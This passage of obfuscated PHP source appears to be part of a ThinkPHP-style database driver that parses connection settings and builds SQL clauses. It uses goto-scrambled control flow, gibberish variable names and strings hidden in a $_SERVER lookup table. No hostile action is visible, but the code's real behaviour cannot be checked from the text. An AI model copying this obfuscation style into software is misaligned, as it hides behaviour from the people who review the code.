$_SERVER[±á õÁ][892], $a‘ã†£Û); } public function factory($bºİ„àŒÇ‡ = '') { goto aÏåîŒÕë‹; A“ÆÉ•âè: return $FÂÜááÁ‚; goto b°ğĞƒêö; AĞ¡Œœ¬†•: $this->dbType = ucwords(strtolower($bºİ„àŒÇ‡[$eµ†¾Æ‚Áù[893]])); $BéÃË‹Ù°å = $eµ†¾Æ‚Áù[895] . $this->dbType; if (class_exists($BéÃË‹Ù°å)) { $FÂÜááÁ‚ = new $BéÃË‹Ù°å($bºİ„àŒÇ‡); if ($eµ†¾Æ‚Áù[748] != strtolower($bºİ„àŒÇ‡[$eµ†¾Æ‚Áù[893]])) { $FÂÜááÁ‚->dbType = strtoupper($this->dbType); } else { $FÂÜááÁ‚->dbType = $this->_getDsnType($bºİ„àŒÇ‡[$eµ†¾Æ‚Áù[848]]); } } else { think_exception(think_lang($eµ†¾Æ‚Áù[896]) . $eµ†¾Æ‚Áù[897] . $BéÃË‹Ù°å); } goto A“ÆÉ•âè; aÏåîŒÕë‹: $eµ†¾Æ‚Áù =& $_SERVER[±á õÁ]; $bºİ„àŒÇ‡ = $this->parseConfig($bºİ„àŒÇ‡); if (empty($bºİ„àŒÇ‡[$eµ†¾Æ‚Áù[893]])) { think_exception(think_lang($eµ†¾Æ‚Áù[894])); } goto AĞ¡Œœ¬†•; b°ğĞƒêö: } public function __call($FãËå¢ Ä, $aŸ¹½‰Ü‹Ò) { if (method_exists($this, $FãËå¢ Ä)) { return call_user_func_array(array($this, $FãËå¢ Ä), $aŸ¹½‰Ü‹Ò); } } protected function _getDsnType($eãµ™•ßŠ­) { $c§ÀÚÍê = explode($_SERVER[±á õÁ][4], $eãµ™•ßŠ­); $E£ÅµŒ‚Ü = strtoupper(trim($c§ÀÚÍê[0])); return $E£ÅµŒ‚Ü; } private function parseConfig($D‘ÀÚ·Ì¶ = '') { $Añ×ÉÄÍ÷´ =& $_SERVER[±á õÁ]; if (!empty($D‘ÀÚ·Ì¶) && is_string($D‘ÀÚ·Ì¶)) { $D‘ÀÚ·Ì¶ = $this->parseDSN($D‘ÀÚ·Ì¶); } elseif (is_array($D‘ÀÚ·Ì¶)) { $D‘ÀÚ·Ì¶ = array_change_key_case($D‘ÀÚ·Ì¶); $D‘ÀÚ·Ì¶ = array($Añ×ÉÄÍ÷´[893] => $D‘ÀÚ·Ì¶[$Añ×ÉÄÍ÷´[747]], $Añ×ÉÄÍ÷´[821] => $D‘ÀÚ·Ì¶[$Añ×ÉÄÍ÷´[898]], $Añ×ÉÄÍ÷´[822] => $D‘ÀÚ·Ì¶[$Añ×ÉÄÍ÷´[899]], $Añ×ÉÄÍ÷´[819] => $D‘ÀÚ·Ì¶[$Añ×ÉÄÍ÷´[900]], $Añ×ÉÄÍ÷´[820] => $D‘ÀÚ·Ì¶[$Añ×ÉÄÍ÷´[901]], $Añ×ÉÄÍ÷´[27] => $D‘ÀÚ·Ì¶[$Añ×ÉÄÍ÷´[902]], $Añ×ÉÄÍ÷´[848] => $D‘ÀÚ·Ì¶[$Añ×ÉÄÍ÷´[749]], $Añ×ÉÄÍ÷´[23] => isset($D‘ÀÚ·Ì¶[$Añ×ÉÄÍ÷´[903]]) ? $D‘ÀÚ·Ì¶[$Añ×ÉÄÍ÷´[903]] : array()); } elseif (empty($D‘ÀÚ·Ì¶)) { if (think_config($Añ×ÉÄÍ÷´[904]) && $Añ×ÉÄÍ÷´[748] != strtolower(think_config($Añ×ÉÄÍ÷´[905]))) { $D‘ÀÚ·Ì¶ = $this->parseDSN(think_config($Añ×ÉÄÍ÷´[904])); } else { $D‘ÀÚ·Ì¶ = array($Añ×ÉÄÍ÷´[893] => think_config($Añ×ÉÄÍ÷´[905]), $Añ×ÉÄÍ÷´[821] => think_config($Añ×ÉÄÍ÷´[906]), $Añ×ÉÄÍ÷´[822] => think_config($Añ×ÉÄÍ÷´[907]), $Añ×ÉÄÍ÷´[819] => think_config($Añ×ÉÄÍ÷´[908]), $Añ×ÉÄÍ÷´[820] => think_config($Añ×ÉÄÍ÷´[909]), $Añ×ÉÄÍ÷´[27] => think_config($Añ×ÉÄÍ÷´[249]), $Añ×ÉÄÍ÷´[848] => think_config($Añ×ÉÄÍ÷´[904]), $Añ×ÉÄÍ÷´[23] => think_config($Añ×ÉÄÍ÷´[910])); } } return $D‘ÀÚ·Ì¶; } protected function initConnect($Aåš›çØ = true) { if (1 == think_config($_SERVER[±á õÁ][28])) { $this->_linkID = $this->multiConnect($Aåš›çØ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Dõœ¿×ÛÑç => $d‹¨Ò×ÔÔó) { $this->_linkID = $d‹¨Ò×ÔÔó; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($A¦ÈÎÂ¤ğ· = false) { $d÷¦íÆªÆ =& $_SERVER[±á õÁ]; static $a‡¤ÚœŒ‚ = array(); if (empty($a‡¤ÚœŒ‚)) { foreach ($this->config as $a“…Ş†«®ñ => $c¡°‰‘ƒÇ) { $a‡¤ÚœŒ‚[$a“…Ş†«®ñ] = explode($d÷¦íÆªÆ[57], $c¡°‰‘ƒÇ); } } if (think_config($d÷¦íÆªÆ[911])) { if ($A¦ÈÎÂ¤ğ·) { $c •¼ÎöÒ¨ = floor(mt_rand(0, think_config($d÷¦íÆªÆ[912]) - 1)); } else { if (is_numeric(think_config($d÷¦íÆªÆ[913]))) { $c •¼ÎöÒ¨ = think_config($d÷¦íÆªÆ[913]); } else { $c •¼ÎöÒ¨ = floor(mt_rand(think_config($d÷¦íÆªÆ[912]), count($a‡¤ÚœŒ‚[$d÷¦íÆªÆ[819]]) - 1)); } } } else { $c •¼ÎöÒ¨ = floor(mt_rand(0, count($a‡¤ÚœŒ‚[$d÷¦íÆªÆ[819]]) - 1)); } $a©ˆ¾îà = array($d÷¦íÆªÆ[821] => isset($a‡¤ÚœŒ‚[$d÷¦íÆªÆ[821]][$c •¼ÎöÒ¨]) ? $a‡¤ÚœŒ‚[$d÷¦íÆªÆ[821]][$c •¼ÎöÒ¨] : $a‡¤ÚœŒ‚[$d÷¦íÆªÆ[821]][0], $d÷¦íÆªÆ[822] => isset($a‡¤ÚœŒ‚[$d÷¦íÆªÆ[822]][$c •¼ÎöÒ¨]) ? $a‡¤ÚœŒ‚[$d÷¦íÆªÆ[822]][$c •¼ÎöÒ¨] : $a‡¤ÚœŒ‚[$d÷¦íÆªÆ[822]][0], $d÷¦íÆªÆ[819] => isset($a‡¤ÚœŒ‚[$d÷¦íÆªÆ[819]][$c •¼ÎöÒ¨]) ? $a‡¤ÚœŒ‚[$d÷¦íÆªÆ[819]][$c •¼ÎöÒ¨] : $a‡¤ÚœŒ‚[$d÷¦íÆªÆ[819]][0], $d÷¦íÆªÆ[820] => isset($a‡¤ÚœŒ‚[$d÷¦íÆªÆ[820]][$c •¼ÎöÒ¨]) ? $a‡¤ÚœŒ‚[$d÷¦íÆªÆ[820]][$c •¼ÎöÒ¨] : $a‡¤ÚœŒ‚[$d÷¦íÆªÆ[820]][0], $d÷¦íÆªÆ[27] => isset($a‡¤ÚœŒ‚[$d÷¦íÆªÆ[27]][$c •¼ÎöÒ¨]) ? $a‡¤ÚœŒ‚[$d÷¦íÆªÆ[27]][$c •¼ÎöÒ¨] : $a‡¤ÚœŒ‚[$d÷¦íÆªÆ[27]][0], $d÷¦íÆªÆ[848] => isset($a‡¤ÚœŒ‚[$d÷¦íÆªÆ[848]][$c •¼ÎöÒ¨]) ? $a‡¤ÚœŒ‚[$d÷¦íÆªÆ[848]][$c •¼ÎöÒ¨] : $a‡¤ÚœŒ‚[$d÷¦íÆªÆ[848]][0], $d÷¦íÆªÆ[23] => isset($a‡¤ÚœŒ‚[$d÷¦íÆªÆ[23]][$c •¼ÎöÒ¨]) ? $a‡¤ÚœŒ‚[$d÷¦íÆªÆ[23]][$c •¼ÎöÒ¨] : $a‡¤ÚœŒ‚[$d÷¦íÆªÆ[23]][0]); return $this->connect($a©ˆ¾îà, $c •¼ÎöÒ¨); } public function parseDSN($f¢¿±ßÅ¸«) { $eâ®ñ£Ëº =& $_SERVER[±á õÁ]; if (empty($f¢¿±ßÅ¸«)) { return !1; } $e¢½ç¶³ = parse_url($f¢¿±ßÅ¸«); if ($e¢½ç¶³[$eâ®ñ£Ëº[182]]) { $eöÒÏÆ˜ãƒ = array($eâ®ñ£Ëº[893] => $e¢½ç¶³[$eâ®ñ£Ëº[182]], $eâ®ñ£Ëº[821] => isset($e¢½ç¶³[$eâ®ñ£Ëº[559]]) ? $e¢½ç¶³[$eâ®ñ£Ëº[559]] : $eâ®ñ£Ëº[43], $eâ®ñ£Ëº[822] => isset($e¢½ç¶³[$eâ®ñ£Ëº[914]]) ? $e¢½ç¶³[$eâ®ñ£Ëº[914]] : $eâ®ñ£Ëº[43], $eâ®ñ£Ëº[819] => isset($e¢½ç¶³[$eâ®ñ£Ëº[183]]) ? $e¢½ç¶³[$eâ®ñ£Ëº[183]] : $eâ®ñ£Ëº[43], $eâ®ñ£Ëº[820] => isset($e¢½ç¶³[$eâ®ñ£Ëº[184]]) ? $e¢½ç¶³[$eâ®ñ£Ëº[184]] : $eâ®ñ£Ëº[43], $eâ®ñ£Ëº[27] => isset($e¢½ç¶³[$eâ®ñ£Ëº[85]]) ? substr($e¢½ç¶³[$eâ®ñ£Ëº[85]], 1) : $eâ®ñ£Ëº[43]); } else { preg_match($eâ®ñ£Ëº[915], trim($f¢¿±ßÅ¸«), $E´ê¹×åÄÂ); $eöÒÏÆ˜ãƒ = array($eâ®ñ£Ëº[893] => $E´ê¹×åÄÂ[1], $eâ®ñ£Ëº[821] => $E´ê¹×åÄÂ[2], $eâ®ñ£Ëº[822] => $E´ê¹×åÄÂ[3], $eâ®ñ£Ëº[819] => $E´ê¹×åÄÂ[4], $eâ®ñ£Ëº[820] => $E´ê¹×åÄÂ[5], $eâ®ñ£Ëº[27] => $E´ê¹×åÄÂ[6]); } $eöÒÏÆ˜ãƒ[$eâ®ñ£Ëº[848]] = $eâ®ñ£Ëº[43]; return $eöÒÏÆ˜ãƒ; } protected function debug() { $f‘ŒŠçÒ =& $_SERVER[±á õÁ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $f‘ŒŠçÒ[916]; if (think_config($f‘ŒŠçÒ[917])) { think_status($f‘ŒŠçÒ[918]); think_trace($this->queryStr . $f‘ŒŠçÒ[919] . think_status($f‘ŒŠçÒ[30], $f‘ŒŠçÒ[918], 6) . $f‘ŒŠçÒ[920], $f‘ŒŠçÒ[43], $f‘ŒŠçÒ[921]); } } protected function parseLock($CÉÌ«Äæˆ… = false) { $Dò³ÑÊó¶É =& $_SERVER[±á õÁ]; if (!$CÉÌ«Äæˆ…) { return $Dò³ÑÊó¶É[43]; } if ($Dò³ÑÊó¶É[850] == $this->dbType) { return $Dò³ÑÊó¶É[922]; } return $Dò³ÑÊó¶É[923]; } protected function parseSet($A¿ÕÛ½Ò”) { $C•¦ Éò¾‚ =& $_SERVER[±á õÁ]; foreach ($A¿ÕÛ½Ò” as $b†îßçÒƒ => $c•¦¼¢´İ¼) { if (is_array($c•¦¼¢´İ¼) && $C•¦ Éò¾‚[300] == $c•¦¼¢´İ¼[0]) { $Fø¬å÷òº[] = $this->parseKey($b†îßçÒƒ) . $C•¦ Éò¾‚[924] . $c•¦¼¢´İ¼[1]; } elseif (is_scalar($c•¦¼¢´İ¼) || is_null($c•¦¼¢´İ¼)) { $Fø¬å÷òº[] = $this->parseKey($b†îßçÒƒ) . $C•¦ Éò¾‚[924] . $this->parseValue($c•¦¼¢´İ¼); } } return $C•¦ Éò¾‚[925] . implode($C•¦ Éò¾‚[57], $Fø¬å÷òº); } protected function bindParam($e®É†”÷, $cğËÅØÛ×“) { $this->bind[$_SERVER[±á õÁ][4] . $e®É†”÷] = $cğËÅØÛ×“; } protected function parseBind($cùÕß‚Àß) { $cùÕß‚Àß = array_merge($this->bind, $cùÕß‚Àß); $this->bind = array(); return $cùÕß‚Àß; } function parseKey(&$cà°Ô»¦Æ, $A”²ÖæÜ¼ä = true) { if ($A”²ÖæÜ¼ä) { $cà°Ô»¦Æ = $this->parseKeyCheck($cà°Ô»¦Æ); } return $cà°Ô»¦Æ; } function parseKeyCheck($D¹¦¾‚Š¾É) { $EÜ±ŠÅ¾È× =& $_SERVER[±á õÁ]; $D¹¦¾‚Š¾É = trim($D¹¦¾‚Š¾É); if (!preg_match($EÜ±ŠÅ¾È×[926], $D¹¦¾‚Š¾É)) { think_exception($EÜ±ŠÅ¾È×[927] . $D¹¦¾‚Š¾É); } return $D¹¦¾‚Š¾É; } protected function parseValue($e²âíïâŸÀ) { $eÕçŸ‰àâ =& $_SERVER[±á õÁ]; if (is_string($e²âíïâŸÀ)) { $e²âíïâŸÀ = $eÕçŸ‰àâ[889] . $this->escapeString($e²âíïâŸÀ) . $eÕçŸ‰àâ[889]; } elseif (isset($e²âíïâŸÀ[0]) && is_string($e²âíïâŸÀ[0]) && strtolower($e²âíïâŸÀ[0]) == $eÕçŸ‰àâ[300]) { $e²âíïâŸÀ = $this->escapeString($e²âíïâŸÀ[1]); } elseif (is_array($e²âíïâŸÀ)) { $e²âíïâŸÀ = array_map(array($this, $eÕçŸ‰àâ[890]), $e²âíïâŸÀ); } elseif (is_bool($e²âíïâŸÀ)) { $e²âíïâŸÀ = $e²âíïâŸÀ ? $eÕçŸ‰àâ[93] : $eÕçŸ‰àâ[493]; } elseif (is_null($e²âíïâŸÀ)) { $e²âíïâŸÀ = $eÕçŸ‰àâ[109]; } return $e²âíïâŸÀ; } protected function parseField($c›ˆÇå’†Ã) { $DŸõÏ„¡äç =& $_SERVER[±á õÁ]; if (is_string($c›ˆÇå’†Ã) && strpos($c›ˆÇå’†Ã, $DŸõÏ„¡äç[57])) { $c›ˆÇå’†Ã = explode($DŸõÏ„¡äç[57], $c›ˆÇå’†Ã); } if (is_array($c›ˆÇå’†Ã)) { $AÅŠÚÉÊ¾ = array(); foreach ($c›ˆÇå’†Ã as $C÷İ«…Øğ¶ => $B‰Ş„œ‡«±) { if (!is_numeric($C÷İ«…Øğ¶)) { $AÅŠÚÉÊ¾[] = $this->parseKey($C÷İ«…Øğ¶) . $DŸõÏ„¡äç[928] . $this->parseKey($B‰Ş„œ‡«±); } else { $AÅŠÚÉÊ¾[] = $this->parseKey($B‰Ş„œ‡«±); } } $B–éØ‡ë  = implode($DŸõÏ„¡äç[57], $AÅŠÚÉÊ¾); } elseif (is_string($c›ˆÇå’†Ã) && !empty($c›ˆÇå’†Ã)) { $B–éØ‡ë  = $c›ˆÇå’†Ã; } else { $B–éØ‡ë  = $DŸõÏ„¡äç[190]; } return $B–éØ‡ë ; } protected function parseTable($BØª‘Ìá¦) { $CÆ¨½ğÔ¢ =& $_SERVER[±á õÁ]; if (is_array($BØª‘Ìá¦)) { $A©˜«¼âÜ¬ = array(); foreach ($BØª‘Ìá¦ as $Bº‘¼­×…¢ => $B÷®·„¬•) { if (!is_numeric($Bº‘¼­×…¢)) { $A©˜«¼âÜ¬[] = $this->parseKey($Bº‘¼­×…¢) . $CÆ¨½ğÔ¢[60] . $this->parseKey($B÷®·„¬•); } else { $A©˜«¼âÜ¬[] = $this->parseKey($Bº‘¼­×…¢); } } $BØª‘Ìá¦ = $A©˜«¼âÜ¬; } elseif (is_string($BØª‘Ìá¦)) { if (strstr($BØª‘Ìá¦, $CÆ¨½ğÔ¢[60])) { return $BØª‘Ìá¦; } $BØª‘Ìá¦ = explode($CÆ¨½ğÔ¢[57], $BØª‘Ìá¦); array_walk($BØª‘Ìá¦, array($this, $CÆ¨½ğÔ¢[839])); } return $CÆ¨½ğÔ¢[833] . trim(implode($CÆ¨½ğÔ¢[929], $BØª‘Ìá¦), $CÆ¨½ğÔ¢[383]) . $CÆ¨½ğÔ¢[833]; } protected function parseWhere($CõÜâØ†ß) { $EœÔ­Å®ÛĞ =& $_SERVER[±á õÁ]; $C–ÆÎ“¼ö˜ = $EœÔ­Å®ÛĞ[43]; if (is_string($CõÜâØ†ß)) { $C–ÆÎ“¼ö˜ = $CõÜâØ†ß; } else { $Bö¶¼ñ¬à = isset($CõÜâØ†ß[$EœÔ­Å®ÛĞ[930]]) ? strtoupper($CõÜâØ†ß[$EœÔ­Å®ÛĞ[930]]) : $EœÔ­Å®ÛĞ[43]; if (in_array($Bö¶¼ñ¬à, array($EœÔ­Å®ÛĞ[931], $EœÔ­Å®ÛĞ[932], $EœÔ­Å®ÛĞ[933]))) { $Bö¶¼ñ¬à = $EœÔ­Å®ÛĞ[60] . $Bö¶¼ñ¬à . $EœÔ­Å®ÛĞ[60]; unset($CõÜâØ†ß[$EœÔ­Å®ÛĞ[930]]); } else { $Bö¶¼ñ¬à = $EœÔ­Å®ÛĞ[934]; } foreach ($CõÜâØ†ß as $f ¡ŠÅ¢Ñ¡ => $BÕóŒ¹õœó) { $C–ÆÎ“¼ö˜ .= $EœÔ­Å®ÛĞ[280]; if (is_numeric($f ¡ŠÅ¢Ñ¡)) { $f ¡ŠÅ¢Ñ¡ = $EœÔ­Å®ÛĞ[935]; } if (0 === strpos($f ¡ŠÅ¢Ñ¡, $EœÔ­Å®ÛĞ[80])) { $C–ÆÎ“¼ö˜ .= $this->parseThinkWhere($f ¡ŠÅ¢Ñ¡, $BÕóŒ¹õœó); } else { if (!preg_match($EœÔ­Å®ÛĞ[936], trim($f ¡ŠÅ¢Ñ¡))) { think_exception(think_lang($EœÔ­Å®ÛĞ[937]) . $EœÔ­Å®ÛĞ[4] . $f ¡ŠÅ¢Ñ¡); } $cÈõ‹ö¬î› = is_array($BÕóŒ¹õœó) && isset($BÕóŒ¹õœó[$EœÔ­Å®ÛĞ[938]]); $f ¡ŠÅ¢Ñ¡ = trim($f ¡ŠÅ¢Ñ¡); if (strpos($f ¡ŠÅ¢Ñ¡, $EœÔ­Å®ÛĞ[286])) { $aœ®’¡øï = explode($EœÔ­Å®ÛĞ[286], $f ¡ŠÅ¢Ñ¡); $fî»ÁÇÏÈ¥ = array(); foreach ($aœ®’¡øï as $CÃçñ©¦·© => $b˜ó¿éÚÙ´) { $f¢»Ş¢ˆÖ = $cÈõ‹ö¬î› ? $BÕóŒ¹õœó[$CÃçñ©¦·©] : $BÕóŒ¹õœó; $fî»ÁÇÏÈ¥[] = $EœÔ­Å®ÛĞ[263] . $this->parseWhereItem($this->parseKey($b˜ó¿éÚÙ´), $f¢»Ş¢ˆÖ) . $EœÔ­Å®ÛĞ[838]; } $C–ÆÎ“¼ö˜ .= implode($EœÔ­Å®ÛĞ[939], $fî»ÁÇÏÈ¥); } elseif (strpos($f ¡ŠÅ¢Ñ¡, $EœÔ­Å®ÛĞ[287])) { $aœ®’¡øï = explode($EœÔ­Å®ÛĞ[287], $f ¡ŠÅ¢Ñ¡); $fî»ÁÇÏÈ¥ = array(); foreach ($aœ®’¡øï as $CÃçñ©¦·© => $b˜ó¿éÚÙ´) { $f¢»Ş¢ˆÖ = $cÈõ‹ö¬î› ? $BÕóŒ¹õœó[$CÃçñ©¦·©] : $BÕóŒ¹õœó; $fî»ÁÇÏÈ¥[] = $EœÔ­Å®ÛĞ[263] . $this->parseWhereItem($this->parseKey($b˜ó¿éÚÙ´), $f¢»Ş¢ˆÖ) . $EœÔ­Å®ÛĞ[838]; } $C–ÆÎ“¼ö˜ .= implode($EœÔ­Å®ÛĞ[934], $fî»ÁÇÏÈ¥); } else { $C–ÆÎ“¼ö˜ .= $this->parseWhereItem($this->parseKey($f ¡ŠÅ¢Ñ¡), $BÕóŒ¹õœó); } } $C–ÆÎ“¼ö˜ .= $EœÔ­Å®ÛĞ[281] . $Bö¶¼ñ¬à; } $C–ÆÎ“¼ö˜ = substr($C–ÆÎ“¼ö˜, 0, -strlen($Bö¶¼ñ¬à)); } return empty($C–ÆÎ“¼ö˜) ? $EœÔ­Å®ÛĞ[43] : $EœÔ­Å®ÛĞ[940] . $C–ÆÎ“¼ö˜; } protected function parseWhereItem($B’Äñ­ÚÜ³, $D§Ğ‚º¯‘) { $D“¾ƒ‚³²Ä =& $_SERVER[±á õÁ]; $DÀ•ª˜´”Ğ = $D“¾ƒ‚³²Ä[43]; if (is_array($D§Ğ‚º¯‘)) { if (is_string($D§Ğ‚º¯‘[0])) { $fçÏí¥¾½Ú = strtolower($D§Ğ‚º¯‘[0]); if (in_array($D§Ğ‚º¯‘[0], array($D“¾ƒ‚³²Ä[924], $D“¾ƒ‚³²Ä[941], $D“¾ƒ‚³²Ä[942], $D“¾ƒ‚³²Ä[943], $D“¾ƒ‚³²Ä[944], $D“¾ƒ‚³²Ä[945]))) { $DÀ•ª˜´”Ğ .= $B’Äñ­ÚÜ³ . $D“¾ƒ‚³²Ä[60] . $D§Ğ‚º¯‘[0] . $D“¾ƒ‚³²Ä[60] . $this->parseValue($D§Ğ‚º¯‘[1]); } elseif (preg_match($D“¾ƒ‚³²Ä[946], $D§Ğ‚º¯‘[0])) { $DÀ•ª˜´”Ğ .= $B’Äñ­ÚÜ³ . $D“¾ƒ‚³²Ä[60] . $this->exp[$fçÏí¥¾½Ú] . $D“¾ƒ‚³²Ä[60] . $this->parseValue($D§Ğ‚º¯‘[1]); } elseif (preg_match($D“¾ƒ‚³²Ä[947], $D§Ğ‚º¯‘[0])) { if (is_array($D§Ğ‚º¯‘[1])) { $Eò«Œœ´¾ = isset($D§Ğ‚º¯‘[2]) ? strtoupper($D§Ğ‚º¯‘[2]) : $D“¾ƒ‚³²Ä[932]; if (in_array($Eò«Œœ´¾, array($D“¾ƒ‚³²Ä[931], $D“¾ƒ‚³²Ä[932], $D“¾ƒ‚³²Ä[933]))) { $bğ„‡Ò³¶ª = array(); foreach ($D§Ğ‚º¯‘[1] as $dÒ’††‚©¬) { $bğ„‡Ò³¶ª[] = $B’Äñ­ÚÜ³ . $D“¾ƒ‚³²Ä[60] . $this->exp[$fçÏí¥¾½Ú] . $D“¾ƒ‚³²Ä[60] . $this->parseValue($dÒ’††‚©¬); } $DÀ•ª˜´”Ğ .= $D“¾ƒ‚³²Ä[263] . implode($D“¾ƒ‚³²Ä[60] . $Eò«Œœ´¾ . $D“¾ƒ‚³²Ä[60], $bğ„‡Ò³¶ª) . $D“¾ƒ‚³²Ä[838]; } } else { $DÀ•ª˜´”Ğ .= $B’Äñ­ÚÜ³ . $D“¾ƒ‚³²Ä[60] . $this->exp[$fçÏí¥¾½Ú] . $D“¾ƒ‚³²Ä[60] . $this->parseValue($D§Ğ‚º¯‘[1]); } } elseif ($D“¾ƒ‚³²Ä[300] == $fçÏí¥¾½Ú) { $DÀ•ª˜´”Ğ .= $D“¾ƒ‚³²Ä[836] . $B’Äñ­ÚÜ³ . $D“¾ƒ‚³²Ä[60] . $D§Ğ‚º¯‘[1] . $D“¾ƒ‚³²Ä[948]; } elseif (preg_match($D“¾ƒ‚³²Ä[949], $D§Ğ‚º¯‘[0])) { $DÀ•ª˜´”Ğ .= $D§Ğ‚º¯‘[0]; } elseif (preg_match($D“¾ƒ‚³²Ä[950], $D§Ğ‚º¯‘[0])) { if (isset($D§Ğ‚º¯‘[2]) && $D“¾ƒ‚³²Ä[300] == $D§Ğ‚º¯‘[2]) { $DÀ•ª˜´”Ğ .= $B’Äñ­ÚÜ³ . $D“¾ƒ‚³²Ä[60] . $this->exp[$fçÏí¥¾½Ú] . $D“¾ƒ‚³²Ä[60] . $D§Ğ‚º¯‘[1]; } else { if (is_string($D§Ğ‚º¯‘[1])) { $D§Ğ‚º¯‘[1] = explode($D“¾ƒ‚³²Ä[57], $D§Ğ‚º¯‘[1]); } $BÜ”ª–ÁÇé = implode($D“¾ƒ‚³²Ä[57], $this->parseValue($D§Ğ‚º¯‘[1])); $DÀ•ª˜´”Ğ .= $B’Äñ­ÚÜ³ . $D“¾ƒ‚³²Ä[60] . $this->exp[$fçÏí¥¾½Ú] . $D“¾ƒ‚³²Ä[836] . $BÜ”ª–ÁÇé . $D“¾ƒ‚³²Ä[838]; } } elseif (preg_match($D“¾ƒ‚³²Ä[951], $D§Ğ‚º¯‘[0])) { $eŠ°å¼¨”î = is_string($D§Ğ‚º¯‘[1]) ? explode($D“¾ƒ‚³²Ä[57], $D§Ğ‚º¯‘[1]) : $D§Ğ‚º¯‘[1]; $DÀ•ª˜´”Ğ .= $D“¾ƒ‚³²Ä[836] . $B’Äñ­ÚÜ³ . $D“¾ƒ‚³²Ä[60] . $this->exp[$fçÏí¥¾½Ú] . $D“¾ƒ‚³²Ä[60] . $this->parseValue($eŠ°å¼¨”î[0]) . $D“¾ƒ‚³²Ä[934] . $this->parseValue($eŠ°å¼¨”î[1]) . $D“¾ƒ‚³²Ä[281]; } else { think_exception(think_lang($D“¾ƒ‚³²Ä[937]) . $D“¾ƒ‚³²Ä[4] . $D§Ğ‚º¯‘[0]); } } else { $aœÛŒ”ê‚¯ = count($D§Ğ‚º¯‘); $fÇªØñ—íÓ = $D“¾ƒ‚³²Ä[43]; if (is_string($D§Ğ‚º¯‘[$aœÛŒ”ê‚¯ - 1])) { $fÇªØñ—íÓ = isset($D§Ğ‚º¯‘[$aœÛŒ”ê‚¯ - 1]) ? strtoupper($D§Ğ‚º¯‘[$aœÛŒ”ê‚¯ - 1]) : $D“¾ƒ‚³²Ä[43]; if (in_array($fÇªØñ—íÓ, array($D“¾ƒ‚³²Ä[931], $D“¾ƒ‚³²Ä[932], $D“¾ƒ‚³²Ä[933]))) { $aœÛŒ”ê‚¯ = $aœÛŒ”ê‚¯ - 1; } } else { $fÇªØñ—íÓ = $D“¾ƒ‚³²Ä[931]; } for ($fò‘Ñğ• = 0; $fò‘Ñğ• < $aœÛŒ”ê‚¯; $fò‘Ñğ•++) { $eŠ°å¼¨”î = is_array($D§Ğ‚º¯‘[$fò‘Ñğ•]) ? $D§Ğ‚º¯‘[$fò‘Ñğ•][1] : $D§Ğ‚º¯‘[$fò‘Ñğ•]; if ($D“¾ƒ‚³²Ä[300] == strtolower($D§Ğ‚º¯‘[$fò‘Ñğ•][0])) { $DÀ•ª˜´”Ğ .= $D“¾ƒ‚³²Ä[263] . $B’Äñ­ÚÜ³ . $D“¾ƒ‚³²Ä[60] . $eŠ°å¼¨”î . $D“¾ƒ‚³²Ä[948] . $fÇªØñ—íÓ . $D“¾ƒ‚³²Ä[60]; } else { $D‰¡í¡ŒİÈ = is_array($D§Ğ‚º¯‘[$fò‘Ñğ•]) ? $this->exp[strtolower($D§Ğ‚º¯‘[$fò‘Ñğ•][0])] : $D“¾ƒ‚³²Ä[924]; if (!$D‰¡í¡ŒİÈ && is_array($D§Ğ‚º¯‘[$fò‘Ñğ•]) && in_array($D§Ğ‚º¯‘[$fò‘Ñğ•][0], array($D“¾ƒ‚³²Ä[924], $D“¾ƒ‚³²Ä[941], $D“¾ƒ‚³²Ä[942], $D“¾ƒ‚³²Ä[943], $D“¾ƒ‚³²Ä[944], $D“¾ƒ‚³²Ä[945]))) { $D‰¡í¡ŒİÈ = $D§Ğ‚º¯‘[$fò‘Ñğ•][0]; } $DÀ•ª˜´”Ğ .= $D“¾ƒ‚³²Ä[263] . $B’Äñ­ÚÜ³ . $D“¾ƒ‚³²Ä[60] . $D‰¡í¡ŒİÈ . $D“¾ƒ‚³²Ä[60] . $this->parseValue($eŠ°å¼¨”î) . $D“¾ƒ‚³²Ä[948] . $fÇªØñ—íÓ . $D“¾ƒ‚³²Ä[60]; } } $DÀ•ª˜´”Ğ = substr($DÀ•ª˜´”Ğ, 0, -4); } } else { $DÀ•ª˜´”Ğ .= $B’Äñ­ÚÜ³ . $D“¾ƒ‚³²Ä[952] . $this->parseValue($D§Ğ‚º¯‘); } return $DÀ•ª˜´”Ğ; } protected function parseThinkWhere($BÉ®÷–‚ñ¬, $eÊ“¤ì•ˆ) { $bÇßÀà´‹£ =& $_SERVER[±á õÁ]; $cªäÅíÈà´ = $bÇßÀà´‹£[43]; switch ($BÉ®÷–‚ñ¬) { case $bÇßÀà´‹£[355]: $cªäÅíÈà´ = $eÊ“¤ì•ˆ; break; case $bÇßÀà´‹£[935]: $cªäÅíÈà´ = is_string($eÊ“¤ì•ˆ) ? $eÊ“¤ì•ˆ : substr($this->parseWhere($eÊ“¤ì•ˆ), 6); break; case $bÇßÀà´‹£[953]: parse_str($eÊ“¤ì•ˆ, $d ê”»½çË); if (isset($d ê”»½çË[$bÇßÀà´‹£[930]])) { $dƒ½Šé¦½… = $bÇßÀà´‹£[60] . strtoupper($d ê”»½çË[$bÇßÀà´‹£[930]]) . $bÇßÀà´‹£[60]; unset($d ê”»½çË[$bÇßÀà´‹£[930]]); } else { $dƒ½Šé¦½… = $bÇßÀà´‹£[934]; } $aõº†Üá© = array(); foreach ($d ê”»½çË as $Bé¬×ÕÄ¦É => $fÔİ÷Ï›Í) { $aõº†Üá©[] = $this->parseKey($Bé¬×ÕÄ¦É) . $bÇßÀà´‹£[952] . $this->parseValue($fÔİ÷Ï›Í); } $cªäÅíÈà´ = implode($dƒ½Šé¦½…, $aõº†Üá©); break; } return $cªäÅíÈà´; } protected function parseLimit($AŠîÙ÷¤ˆ‘) { $DõØ®â‹“¦ =& $_SERVER[±á õÁ]; return !empty($AŠîÙ÷¤ˆ‘) ? $DõØ®â‹“¦[58] . $AŠîÙ÷¤ˆ‘ . $DõØ®â‹“¦[60] : $DõØ®â‹“¦[43]; } protected function parseJoin($cß¢î÷«Ûå) { $F»ÈËŞ¿® =& $_SERVER[±á õÁ]; $DÇĞõ²ØĞ = $F»ÈËŞ¿®[43]; if (!empty($cß¢î÷«Ûå)) { if 